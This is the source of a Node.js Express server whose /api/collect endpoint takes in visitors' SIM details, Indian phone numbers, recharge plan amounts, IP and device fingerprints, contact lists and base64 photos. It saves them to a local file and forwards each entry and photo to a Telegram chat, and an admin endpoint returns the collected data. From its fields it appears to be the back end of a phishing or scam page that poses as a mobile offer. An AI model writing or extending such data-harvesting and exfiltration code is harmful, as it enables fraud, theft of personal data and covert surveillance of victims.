require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Data store
const DATA_FILE = path.join(__dirname, 'collected.json');
function readData() {
  if (!fs.existsSync(DATA_FILE)) return [];
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}
function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Telegram
const botToken = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;
let bot = null;
if (botToken) bot = new TelegramBot(botToken, { polling: false });

// -------------------- COLLECT ENDPOINT --------------------
app.post('/api/collect', async (req, res) => {
  const data = req.body;
  // Add IP
  data.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const id = Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2,4).toUpperCase();
  data.claimId = id;
  data.timestamp = new Date().toISOString();

  const all = readData();
  all.push(data);
  writeData(all);

  // Telegram
  if (bot && chatId) {
    let msg = `📱 **New Entry**\nID: #${id}\nSIM: ${data.sim||'N/A'}\nPhone: +91 ${data.phone||'N/A'}\nPlan: ₹${data.plan||'N/A'}\nIP: ${data.ip}\nUA: ${data.ua||'N/A'}\nScreen: ${data.screen||'N/A'}\nMemory: ${data.memory||'N/A'}\nCores: ${data.cores||'N/A'}\nVerify: ${data.verify?'✅':'⏭️'}\nContacts: ${data.contacts?data.contacts.length:0}`;
    try { await bot.sendMessage(chatId, msg, { parse_mode:'Markdown' }); } catch(e) {}
    if (data.photo) {
      try {
        const buf = Buffer.from(data.photo.split(',')[1], 'base64');
        await bot.sendPhoto(chatId, buf, { caption: `Photo #${id}` });
      } catch(e) {}
    }
  }

  res.json({ success: true, claimId: id });
});

// -------------------- ADMIN --------------------
app.get('/admin/data', (req, res) => {
  const token = req.headers.authorization;
  if (token !== `Bearer ${process.env.ADMIN_TOKEN}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  res.json(readData());
});

// -------------------- SERVE FRONTEND --------------------
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
